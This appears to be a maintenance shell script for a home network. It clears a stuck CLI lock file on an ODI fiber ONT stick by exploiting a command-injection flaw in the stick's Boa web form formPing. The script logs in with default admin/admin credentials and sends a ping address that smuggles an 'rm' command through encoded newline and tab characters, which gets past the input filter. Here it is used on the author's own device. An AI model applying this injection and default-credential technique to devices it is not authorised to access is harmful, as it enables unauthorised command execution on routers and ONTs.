#!/bin/sh
# stick-unwedge.sh — clear the ODI stick's /var/run/cli.pid lock WITHOUT a reboot,
# via the formPing command injection (proven 2026-07-09).
#
# Symptom: stick CLI (telnet 192.168.1.1) returns an empty banner / "CLI busy" after
# an ungraceful or banner-only telnet close. /bin/login wrote /var/run/cli.pid and
# never cleared it, so every new login bails. Until now the only fix was a stick
# reboot (~85 s, kills WAN3 PPPoE — single fiber, only internet path).
#
# This clears it over HTTP in ~8 s — no reboot, no pppd kill, no stick-mgmt.
#
# Mechanism (full writeup: docs/reference/odi-wedge-recovery-and-ddm-source.md):
#   Boa POST /boaform/formPing builds  `ping <pingAddr> -c 4 -I <wanif> -w 5 ... > /tmp/ping.tmp`
#   and runs it via system(). boa validates pingAddr (rejects ; backtick spaces) but
#   allows newline %0a (command separator) + tab %09 (argument separator). We send
#   pingAddr = 127.0.0.1 \n rm \t /var/run/cli.pid \n #  →  sh runs `rm /var/run/cli.pid`.
#   boa calls system() ASYNC, so the template's `ping 127.0.0.1` runs first (~4 s),
#   then our rm. We poll stick-exec.py until the CLI comes back.
#
# Runs ON Route10: curls Boa from 192.168.1.2 (the ont_mgmt0 MACVLAN path), then
# verifies via /cfg/scripts/stick-exec.py (clean-exit telnet).
#
# Source-of-truth: scripts/stick-unwedge.sh  →  deploy: scp to /cfg/scripts/stick-unwedge.sh
#
# Usage:
#   /cfg/scripts/stick-unwedge.sh            # detect; clear only if wedged
#   /cfg/scripts/stick-unwedge.sh --force    # clear /var/run/cli.pid regardless

set -u

STICK_IP=192.168.1.1
SRC_IP=192.168.1.2
LOGIN_URL="http://${STICK_IP}/boaform/admin/formLogin"
PING_URL="http://${STICK_IP}/boaform/formPing"
LOGIN_POST='username=admin&password=admin&challenge=&save=Login&submit-url=%2Fadmin%2Flogin.asp'
# pingAddr = 127.0.0.1  %0a(newline)  rm  %09(tab)  /var/run/cli.pid  %0a(newline)  #(comment)
INJECT='pingAddr=127.0.0.1%0arm%09/var/run/cli.pid%0a#&wanif=65535&go=Go&postSecurityFlag=&submit-url=/ping.asp'
STICK_EXEC=/cfg/scripts/stick-exec.py
FORCE=0
[ "${1-}" = "--force" ] && FORCE=1

log() { echo "$(date '+%H:%M:%S') $*"; }

# Clean-exit CLI probe. Returns 0 if the stick CLI is reachable (healthy),
# 3 if stick-exec.py itself is missing, non-zero otherwise (wedged / auth fail).
# stick-exec raises WEDGED without engaging /bin/login, so this does not make a
# wedge worse.
cli_up() {
    [ -x "$STICK_EXEC" ] || return 3          # 3 = can't verify (no stick-exec)
    python3 "$STICK_EXEC" "true" >/dev/null 2>&1
}

# --- decide whether to act ----------------------------------------------------
if [ "$FORCE" -eq 0 ]; then
    case "$(cli_up; echo $?)" in
        0) log "stick CLI is healthy (stick-exec OK) — not wedged. Use --force to clear anyway."; exit 0 ;;
        3) log "WARN: $STICK_EXEC not found — skipping detection, attempting clear anyway." ;;
        *) log "stick CLI is wedged (stick-exec got no banner). Clearing via formPing injection..." ;;
    esac
else
    log "--force: clearing /var/run/cli.pid via formPing injection regardless of state..."
fi

# --- 1. Boa login (IP-bound session from the mgmt path) -----------------------
log "Boa login from ${SRC_IP}..."
if ! curl --http0.9 -s -m 5 --interface "$SRC_IP" -o /dev/null \
        -X POST -d "$LOGIN_POST" "$LOGIN_URL" 2>/dev/null; then
    log "ERROR: Boa login failed — is the stick reachable at ${STICK_IP} via ${SRC_IP}?"; exit 1
fi

# --- 2. Inject  rm /var/run/cli.pid  via formPing (runs async after ping) ------
log "POST /boaform/formPing with injected 'rm /var/run/cli.pid'..."
code=$(curl --http0.9 -s -m 15 --interface "$SRC_IP" -o /dev/null -w '%{http_code}' \
    -X POST --data "$INJECT" "$PING_URL" 2>/dev/null)
log "formPing -> HTTP ${code} (301 = accepted; the rm runs ~4 s later, async)."

# --- 3. Poll for the CLI to come back -----------------------------------------
if [ ! -x "$STICK_EXEC" ]; then
    log "INJECTED. (verify skipped: $STICK_EXEC not present). Run 'stick-exec.py uptime' to confirm."
    exit 0
fi
log "polling stick-exec for recovery (up to ~10 s)..."
i=0
while [ "$i" -lt 5 ]; do
    sleep 2
    i=$((i + 1))
    if cli_up; then
        log "SUCCESS — stick CLI is back after ~$((i * 2)) s. /var/run/cli.pid cleared, no reboot."
        exit 0
    fi
done

# --- 4. Fallback --------------------------------------------------------------
log "FAILED — stick CLI still wedged after the injection + ${i} x 2 s polling."
log "Reboot fallback (~85 s, WAN3 blip):"
log "  curl --http0.9 -s -m 5 --interface $SRC_IP -X POST -d 'reboot_now=Reboot' http://$STICK_IP/boaform/admin/formReboot"
exit 1
